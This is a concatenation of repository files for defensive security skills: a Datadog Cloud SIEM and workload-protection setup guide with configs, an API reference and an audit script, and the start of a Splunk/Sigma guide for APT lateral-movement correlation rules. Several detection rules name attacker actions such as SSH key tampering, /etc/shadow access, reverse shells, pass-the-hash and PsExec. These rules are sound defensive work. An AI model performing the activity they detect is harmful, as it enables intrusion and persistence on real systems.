license: Apache-2.0
nist_ai_rmf:
- GOVERN-1.1
- MEASURE-2.7
- MANAGE-3.1
- GOVERN-4.2
- MAP-2.3
d3fend_techniques:
- Restore Access
- Password Authentication
- Biometric Authentication
- Strong Password Policy
- Restore User Account Access
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1685.002
- T1685.005
---

# Implementing Security Monitoring with Datadog

## When to Use

- Deploying Cloud SIEM to detect real-time threats across cloud infrastructure (AWS, Azure, GCP)
- Creating custom detection rules for attacker techniques, credential abuse, or anomalous behavior
- Enabling Workload Protection (CSM Threats) to monitor file, process, and network activity on hosts and containers
- Meeting compliance requirements (PCI-DSS, SOC 2, HIPAA) that mandate centralized log monitoring and alerting
- Building security dashboards to provide SOC visibility into threat signals, investigation context, and response metrics

**Do not use** for endpoint-only monitoring without cloud infrastructure; use a dedicated EDR solution for purely on-premises endpoint detection.

## Prerequisites

- Datadog account with Security Monitoring (Cloud SIEM) and/or Cloud Security Management enabled
- Datadog API Key and Application Key from Organization Settings > API Keys
- Datadog Agent v7+ installed on hosts/containers that generate security-relevant logs
- Log sources configured for ingestion: AWS CloudTrail, VPC Flow Logs, GuardDuty, Azure Activity Logs, GCP Audit Logs, or on-host logs (auth.log, syslog, Windows Security Events)
- Python 3.9+ with `datadog-api-client` library for programmatic rule management
- Network access from monitored hosts to Datadog intake endpoints (port 443)

## Workflow

### Step 1: Deploy and Configure the Datadog Agent for Security

Install the Datadog Agent and enable security-related features in `datadog.yaml`:

```yaml
# /etc/datadog-agent/datadog.yaml

api_key: <YOUR_DATADOG_API_KEY>
site: datadoghq.com   # or datadoghq.eu, us3.datadoghq.com, etc.

# Enable log collection for Cloud SIEM
logs_enabled: true

# Enable security features
runtime_security_config:
  enabled: true          # Workload Protection (CSM Threats)
  activity_dump:
    enabled: true        # Record process activity for investigation

compliance_config:
  enabled: true          # CIS benchmark checks (CSM Misconfigurations)
  host_benchmarks:
    enabled: true
```

Configure log sources for security-relevant files on Linux:

```yaml
# /etc/datadog-agent/conf.d/auth.d/conf.yaml
logs:
  - type: file
    path: /var/log/auth.log
    source: auth
    service: linux-auth
    tags:
      - env:production
      - security:authentication

  - type: file
    path: /var/log/syslog
    source: syslog
    service: linux-syslog
```

For Windows Security Event Logs:

```yaml
# /etc/datadog-agent/conf.d/win32_event_log.d/conf.yaml
logs:
  - type: windows_event
    channel_path: Security
    source: windows.events
    service: windows-security
    filters:
      - id: [4624, 4625, 4648, 4672, 4688, 4720, 4726, 4740, 4767]
```

Enable the system-probe for Workload Protection (CSM Threats):

```yaml
# /etc/datadog-agent/system-probe.yaml
runtime_security_config:
  enabled: true
  fim_enabled: true        # File Integrity Monitoring
  network_enabled: true    # Network activity monitoring
```

Restart the Agent after configuration changes:

```bash
sudo systemctl restart datadog-agent
sudo datadog-agent status | grep -A5 "Security Agent"
```

### Step 2: Configure Cloud Log Sources for SIEM

Set up AWS CloudTrail, VPC Flow Logs, and GuardDuty ingestion for Cloud SIEM:

```
Datadog App > Security > Cloud SIEM > Configuration > Content Packs

AWS Content Pack:
  1. Enable the AWS integration in Datadog (Integrations > Amazon Web Services)
  2. Configure CloudTrail log forwarding via the Datadog Forwarder Lambda
  3. Enable VPC Flow Logs forwarding to Datadog
  4. Enable GuardDuty findings forwarding

Required IAM permissions for the Datadog role:
  - cloudtrail:LookupEvents
  - logs:FilterLogEvents
  - guardduty:ListDetectors, guardduty:GetFindings
  - s3:GetObject (for CloudTrail S3 bucket)

Azure Content Pack:
  1. Configure Azure Activity Logs via Event Hub to Datadog
  2. Forward Azure AD Sign-in Logs and Audit Logs
  3. Enable Microsoft Defender for Cloud alerts forwarding

GCP Content Pack:
  1. Configure GCP Audit Logs export via Pub/Sub to Datadog
  2. Forward Cloud Audit Logs (Admin Activity, Data Access)
```

Verify log ingestion is working:

```
Datadog App > Logs > Search
  Filter: source:(cloudtrail OR aws.guardduty OR azure.activitylogs)
  Verify: Logs appearing with correct source tags and parsed attributes
```

### Step 3: Enable and Customize Detection Rules

Datadog provides out-of-the-box detection rules that are automatically imported. Review and customize them:

```
Datadog App > Security > Detection Rules

Out-of-the-box rule categories:
  - AWS: IAM policy changes, root account usage, S3 public access
  - Azure: Suspicious sign-ins, resource group deletions
  - GCP: IAM policy modifications, firewall rule changes
  - Authentication: Brute force, impossible travel, credential stuffing
  - Network: Port scanning, DNS tunneling, C2 beaconing
  - Application: SQL injection attempts, XSS, SSRF patterns
```

Create a custom detection rule for brute force login detection:

```
Datadog App > Security > Detection Rules > New Rule

Rule Name: "Brute Force Login Detection - Custom"
Rule Type: Log Detection (Real-time)

Define Search Query:
  source:auth status:error @evt.name:authentication @evt.outcome:failure
  Group By: @usr.id

Set Rule Cases:
  Case 1: When count > 10 in 5 minutes
    Name: "High volume failed logins"
    Severity: HIGH
    Notification: @slack-security-alerts @pagerduty-soc

  Case 2: When count > 50 in 5 minutes
    Name: "Extreme brute force attempt"
    Severity: CRITICAL
    Notification: @slack-security-alerts @pagerduty-soc-critical

Signal Settings:
  Keep signal alive for: 10 minutes
  Maximum signal duration: 24 hours
  Evaluation window: 5 minutes
```

Create a detection rule for AWS root account usage:

```
Rule Name: "AWS Root Account Console Login"
Rule Type: Log Detection

Query:
  source:cloudtrail @evt.name:ConsoleLogin @userIdentity.type:Root

Severity: CRITICAL
Notification Message:
  "AWS Root account console login detected from IP {{@network.client.ip}}.
   Account: {{@usr.account_id}}
   Region: {{@cloud.region}}
   MFA Used: {{@additionalEventData.MFAUsed}}"

Tags: attack:initial-access, mitre:T1078
```

### Step 4: Configure Workload Protection (CSM Threats)

Set up runtime threat detection for hosts and containers:

```
Datadog App > Security > Cloud Security Management > Setup

Enable Workload Protection:
  1. Verify Agent has runtime_security_config.enabled: true
  2. Review default Agent rules (file integrity, process execution)
  3. Customize rules for your environment

Default detection categories:
  - Process Execution: Detect reverse shells, crypto miners, exploitation tools
  - File Integrity: Monitor changes to /etc/passwd, /etc/shadow, SSH keys
  - Network Activity: Detect unexpected outbound connections, DNS tunneling
  - Container Escape: Detect privileged container breakout attempts
  - Kernel Module: Detect rootkit or unauthorized kernel module loading
```

Create a custom CSM Threats Agent rule to detect unauthorized SSH key modifications:

```
Datadog App > Security > CSM > Agent Rules > New Agent Rule

Rule Expression:
  open.file.path == "/root/.ssh/authorized_keys" &&
  open.flags & (O_WRONLY | O_RDWR | O_CREAT) > 0 &&
  process.file.name != "sshd"

Rule Name: ssh_key_modification
Description: Detect non-sshd processes modifying root authorized_keys
Tags: attack:persistence, mitre:T1098.004
```

### Step 5: Build Security Dashboards

Create a Cloud SIEM overview dashboard:

```
Datadog App > Dashboards > New Dashboard > "Security Operations Overview"

Widgets:
  1. Signal Count Over Time (timeseries)
     Query: count:security_signal by {signal.rule.name}
     Display: Line chart, last 24 hours

  2. Top Triggered Rules (top list)
     Query: count:security_signal by {signal.rule.name}.as_count()
     Display: Top 10

  3. Critical Signals (query value)
     Query: count:security_signal{severity:critical}
     Conditional format: Red if > 0

  4. Signals by Source (pie chart)
     Query: count:security_signal by {source}

  5. Geographic Threat Map (geomap)
     Query: count:security_signal by {network.client.geoip.country.name}

  6. Top Targeted Users (top list)
     Query: count:security_signal by {usr.id}

  7. Mean Time to Triage (query value)
     Query: avg:security_signal.triage_time

  8. Open Signals by Severity (table)
     Query: count:security_signal{status:open} by {severity}
```

### Step 6: Configure Notification Workflows

Set up automated notification and response workflows:

```
Datadog App > Security > Notification Rules

Rule 1: Critical Signal Escalation
  Condition: severity:critical
  Recipients: @pagerduty-soc-critical @slack-security-incidents
  Message: "CRITICAL security signal: {{signal.rule.name}}
            Source: {{signal.attributes.network.client.ip}}
            Target: {{signal.attributes.usr.id}}
            Details: {{signal.message}}"

Rule 2: High Signal SOC Alert
  Condition: severity:high
  Recipients: @slack-security-alerts
  Suppress: After first notification, suppress for 15 minutes

Rule 3: Compliance Violation
  Condition: rule_type:compliance
  Recipients: @slack-compliance-team @jira-compliance-board

Workflow Automation (Datadog Workflows):
  Trigger: Security signal with severity:critical
  Steps:
    1. Enrich signal with threat intelligence lookup
    2. Create Jira incident ticket
    3. Send Slack notification with investigation context
    4. If source is AWS: Trigger Lambda to isolate resource
```

### Step 7: Validate and Tune Detection Coverage

Test detection rules and tune false positives:

```bash
# Generate a test security event (failed SSH login)
ssh -o StrictHostKeyChecking=no invalid_user@localhost 2>/dev/null

# Verify the event appears in Datadog Logs
# Datadog App > Logs > source:auth status:error

# Check that a security signal was generated
# Datadog App > Security > Signals > Filter by rule name

# Tune noisy rules by adding suppression queries:
# Datadog App > Security > Detection Rules > [Rule] > Edit
# Add suppression: Suppress signal when @usr.id:service-account-*
```

Use the Security Signals API to validate programmatically:

```python
from datadog_api_client import Configuration, ApiClient
from datadog_api_client.v2.api.security_monitoring_api import SecurityMonitoringApi

configuration = Configuration()
# Reads DD_API_KEY and DD_APP_KEY from environment

with ApiClient(configuration) as api_client:
    api = SecurityMonitoringApi(api_client)
    signals = api.search_security_monitoring_signals(
        body={
            "filter": {
                "query": "status:open severity:critical",
                "from": "now-24h",
                "to": "now",
            },
            "sort": {"field": "timestamp", "order": "desc"},
            "page": {"limit": 25},
        }
    )
    for signal in signals.data:
        attrs = signal.attributes
        print(f"[{attrs.severity}] {attrs.title}")
        print(f"  Rule: {attrs.custom.get('rule', {}).get('name', 'N/A')}")
        print(f"  Time: {attrs.timestamp}")
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Cloud SIEM** | Datadog's security information and event management service that analyzes ingested logs in real-time to detect threats using detection rules |
| **Security Signal** | An alert generated when a detection rule matches incoming log data; signals have severity, status (open/triage/closed), and investigation context |
| **Detection Rule** | A query-based rule that evaluates logs or events against conditions (threshold, anomaly, new value, impossible travel) to generate security signals |
| **CSM (Cloud Security Management)** | Datadog platform for infrastructure security including Misconfigurations (compliance benchmarks), Threats (runtime detection), and Vulnerabilities |
| **Workload Protection** | CSM Threats component that monitors file, process, and network activity on hosts and containers using eBPF-based Agent rules |
| **Content Pack** | Pre-built collection of detection rules, dashboards, and log parsers for a specific integration (AWS, Azure, GCP, Okta, etc.) |
| **Agent Rule** | A kernel-level rule evaluated by the Datadog Agent on the host to collect security-relevant events before sending to Datadog for threat detection |
| **Suppression Query** | A filter applied to a detection rule to prevent signals from being generated for known-good activity (reduces false positives) |

## Verification

- [ ] Datadog Agent is installed and reporting on all target hosts (`datadog-agent status` shows security agent running)
- [ ] Security-relevant log sources are ingesting into Datadog (CloudTrail, auth.log, Windows Security Events visible in Log Explorer)
- [ ] Cloud SIEM Content Packs are enabled for all cloud providers in use (AWS, Azure, GCP)
- [ ] Out-of-the-box detection rules are active and generating signals for test events
- [ ] Custom detection rules trigger correctly (test with a simulated failed login burst)
- [ ] Workload Protection (CSM Threats) is enabled and Agent rules are evaluating on hosts
- [ ] Security dashboard displays signal counts, top rules, severity breakdown, and geographic data
- [ ] Notification workflows deliver alerts to Slack, PagerDuty, or Jira for critical and high signals
- [ ] Suppression queries are configured to reduce false positives on noisy rules
- [ ] Security Signals API returns results programmatically for automation integration

===== END FILE =====


===== FILE: skills/implementing-security-monitoring-with-datadog/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-security-monitoring-with-datadog/references/api-reference.md =====
# API Reference: Implementing Security Monitoring with Datadog

## Datadog Security Monitoring API

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/v2/security_monitoring/rules` | GET | List all detection rules |
| `/api/v2/security_monitoring/rules` | POST | Create detection rule |
| `/api/v2/security_monitoring/rules/{id}` | GET | Get rule details |
| `/api/v2/security_monitoring/signals/search` | POST | Search security signals |
| `/api/v2/security_monitoring/signals/{id}` | GET | Get signal details |
| `/api/v2/security_monitoring/signals/{id}/assignee` | PATCH | Update signal assignee |
| `/api/v2/security_monitoring/signals/{id}/state` | PATCH | Update signal state |
| `/api/v1/logs/config/pipelines` | GET | List log pipelines |
| `/api/v1/logs/config/indexes` | GET | List log indexes |
| `/api/v1/monitor` | GET | List all monitors |

## Authentication

```bash
# All requests require both keys
curl -X GET "https://api.datadoghq.com/api/v2/security_monitoring/rules" \
  -H "DD-API-KEY: ${DD_API_KEY}" \
  -H "DD-APPLICATION-KEY: ${DD_APP_KEY}"
```

## Python SDK (datadog-api-client)

```python
from datadog_api_client import Configuration, ApiClient
from datadog_api_client.v2.api.security_monitoring_api import SecurityMonitoringApi

configuration = Configuration()
# Keys read from DD_API_KEY and DD_APP_KEY env vars automatically

with ApiClient(configuration) as api_client:
    api = SecurityMonitoringApi(api_client)
    rules = api.list_security_monitoring_rules()
    signals = api.search_security_monitoring_signals(
        body={"filter": {"query": "status:critical", "from": "now-24h", "to": "now"}}
    )
```

## Detection Rule Types

| Type | Source | Use Case |
|------|--------|----------|
| Log Detection | Ingested logs | SIEM correlation rules |
| Cloud Configuration | Cloud accounts | CSPM compliance checks |
| Infrastructure Configuration | Agent hosts | Host security posture |
| Application Security | APM traces | WAF and attack detection |
| Signal Correlation | Security signals | Multi-signal chaining |

## Signal Severity Levels

| Severity | Triage Priority | Example |
|----------|----------------|---------|
| CRITICAL | Immediate | Active exploitation detected |
| HIGH | < 4 hours | Credential compromise |
| MEDIUM | < 24 hours | Policy violation |
| LOW | Next review cycle | Informational anomaly |
| INFO | No action | Audit trail |

## Log Source Integration

```yaml
# datadog.yaml agent configuration
logs_enabled: true
logs_config:
  container_collect_all: true

# Security-relevant log sources
# conf.d/auth.d/conf.yaml
logs:
  - type: file
    path: /var/log/auth.log
    service: sshd
    source: syslog
    tags: ["security:authentication"]
```

## Cloud SIEM Rule Query Syntax

```
# Failed SSH logins from single IP
source:syslog service:sshd @evt.outcome:failure | count by @network.client.ip > 10

# AWS root account usage
source:cloudtrail @userIdentity.type:Root @evt.name:ConsoleLogin

# Kubernetes privileged container
source:kubernetes @objectRef.resource:pods @requestObject.spec.containers.securityContext.privileged:true
```

### References

- Datadog Security Monitoring API: https://docs.datadoghq.com/api/latest/security-monitoring/
- Datadog Cloud SIEM: https://docs.datadoghq.com/security/cloud_siem/
- Detection Rules: https://docs.datadoghq.com/security/detection_rules/
- datadog-api-client-python: https://github.com/DataDog/datadog-api-client-python

===== END FILE =====


===== FILE: skills/implementing-security-monitoring-with-datadog/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for implementing security monitoring with Datadog.

Configures Cloud SIEM detection rules, queries security signals,
manages log pipelines, and audits security monitoring coverage
using the Datadog API.
"""

import json
import sys
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


class DatadogSecurityAgent:
    """Manages Datadog security monitoring configuration."""

    def __init__(self, api_key, app_key, site="datadoghq.com",
                 output_dir="./datadog_security"):
        self.api_key = api_key
        self.app_key = app_key
        self.base_url = f"https://api.{site}/api"
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _get(self, path, params=None):
        if not requests:
            return None
        try:
            return requests.get(
                f"{self.base_url}{path}", params=params,
                headers={"DD-API-KEY": self.api_key, "DD-APPLICATION-KEY": self.app_key},
                timeout=15,
            )
        except requests.RequestException:
            return None

    def _post(self, path, data=None):
        if not requests:
            return None
        try:
            return requests.post(
                f"{self.base_url}{path}", json=data,
                headers={"DD-API-KEY": self.api_key, "DD-APPLICATION-KEY": self.app_key,
                          "Content-Type": "application/json"},
                timeout=15,
            )
        except requests.RequestException:
            return None

    def list_security_rules(self):
        """List configured security detection rules."""
        resp = self._get("/v2/security_monitoring/rules")
        if resp and resp.status_code == 200:
            rules = resp.json().get("data", [])
            return [{"id": r["id"], "name": r.get("name"), "enabled": r.get("isEnabled"),
                     "type": r.get("type")} for r in rules]
        return []

    def query_security_signals(self, query="*", hours=24):
        """Query security signals from Cloud SIEM."""
        now = datetime.utcnow()
        body = {
            "filter": {"query": query, "from": f"now-{hours}h", "to": "now"},
            "sort": "timestamp", "page": {"limit": 25},
        }
        resp = self._post("/v2/security_monitoring/signals/search", body)
        if resp and resp.status_code == 200:
            signals = resp.json().get("data", [])
            by_severity = {}
            for s in signals:
                sev = s.get("attributes", {}).get("severity", "unknown")
                by_severity[sev] = by_severity.get(sev, 0) + 1
            return {"total": len(signals), "by_severity": by_severity}
        return {"total": 0}

    def list_log_pipelines(self):
        """List log processing pipelines."""
        resp = self._get("/v1/logs/config/pipelines")
        if resp and resp.status_code == 200:
            pipelines = resp.json()
            return [{"id": p["id"], "name": p.get("name"), "enabled": p.get("is_enabled"),
                     "type": p.get("type")} for p in pipelines]
        return []

    def check_log_indexes(self):
        """Check log index configuration for retention."""
        resp = self._get("/v1/logs/config/indexes")
        if resp and resp.status_code == 200:
            indexes = resp.json().get("indexes", [])
            for idx in indexes:
                retention = idx.get("num_retention_days", 0)
                if retention < 90:
                    self.findings.append({"severity": "medium", "type": "Short Log Retention",
                                          "detail": f"Index '{idx.get('name')}' retains {retention} days"})
            return indexes
        return []

    def audit_monitors(self):
        """Audit security-related monitors."""
        resp = self._get("/v1/monitor", params={"tags": "security"})
        if resp and resp.status_code == 200:
            monitors = resp.json()
            return {"total": len(monitors),
                    "by_state": self._count_by(monitors, lambda m: m.get("overall_state", "unknown"))}
        return {"total": 0}

    def _count_by(self, items, key_fn):
        counts = {}
        for item in items:
            k = key_fn(item)
            counts[k] = counts.get(k, 0) + 1
        return counts

    def generate_report(self):
        rules = self.list_security_rules()
        signals = self.query_security_signals()
        pipelines = self.list_log_pipelines()
        indexes = self.check_log_indexes()
        monitors = self.audit_monitors()

        if len(rules) < 10:
            self.findings.append({"severity": "medium", "type": "Low Rule Coverage",
                                  "detail": f"Only {len(rules)} detection rules configured"})

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "detection_rules": {"count": len(rules), "rules": rules[:20]},
            "security_signals": signals,
            "log_pipelines": {"count": len(pipelines), "pipelines": pipelines},
            "monitors": monitors,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "datadog_security_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 3:
        print("Usage: agent.py <api_key> <app_key> [--site datadoghq.eu]")
        sys.exit(1)
    site = "datadoghq.com"
    if "--site" in sys.argv:
        site = sys.argv[sys.argv.index("--site") + 1]
    agent = DatadogSecurityAgent(sys.argv[1], sys.argv[2], site)
    agent.generate_report()


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-siem-correlation-rules-for-apt/SKILL.md =====
---
name: implementing-siem-correlation-rules-for-apt
description: Write multi-event correlation rules in Splunk SPL and Sigma format that
  detect APT lateral movement by chaining Windows authentication events (4624, 4648),
  process execution (4688, Sysmon Event 1), and network connections (Sysmon Event 3)
  across hosts within sliding time windows. Use when building SIEM correlation searches
  to surface multi-stage attack sequences that single-event detections miss, such
  as pass-the-hash or lateral movement chains.
domain: cybersecurity
subdomain: security-operations
tags:
- siem
- correlation-rules
- apt-detection
- lateral-movement
- windows-event-logs
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1021
- T1550
---


# Implementing SIEM Correlation Rules for APT


## When to Use

- When deploying or configuring implementing siem correlation rules for apt capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

1. Install dependencies: `pip install requests pyyaml sigma-cli`
2. Connect to the Splunk REST API and define correlation searches that chain multiple event types across hosts.
3. Build Sigma rules in YAML that express multi-step detection logic for lateral movement patterns:
   - RDP logon (4624 LogonType=10) followed by service installation (7045) on same target within 15 minutes
   - Pass-the-Hash: NTLM logon (4624 LogonType=3) followed by process creation (4688) of admin tools
   - PsExec-style: Named pipe creation (Sysmon 17/18) correlated with remote service creation (7045)
4. Convert Sigma rules to Splunk SPL using `sigma-cli convert`.
5. Deploy correlation searches to Splunk ES via the REST API.
6. Run the agent to generate and install correlation rules, then audit existing rules for coverage gaps.

```bash
python scripts/agent.py --splunk-url https://localhost:8089 --username admin --password changeme --output correlation_report.json
```

## Examples

### Detect RDP Lateral Movement Chain
```
index=wineventlog (EventCode=4624 Logon_Type=10) OR (EventCode=7045)
| transaction Computer maxspan=15m startswith=(EventCode=4624) endswith=(EventCode=7045)
| where eventcount >= 2
| table _time Computer Account_Name ServiceName
```

### Sigma Rule for PsExec Lateral Movement
```yaml
title: PsExec Lateral Movement Detection
logsource:
  product: windows
  service: sysmon
detection:
  pipe_created:
    EventID: 17
    PipeName|startswith: '\PSEXESVC'
  service_installed:
    EventID: 7045
    ServiceFileName|contains: 'PSEXESVC'
  timeframe: 5m
  condition: pipe_created | near service_installed
level: high
```

===== END FILE =====


===== FILE: skills/implementing-siem-correlation-rules-for-apt/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
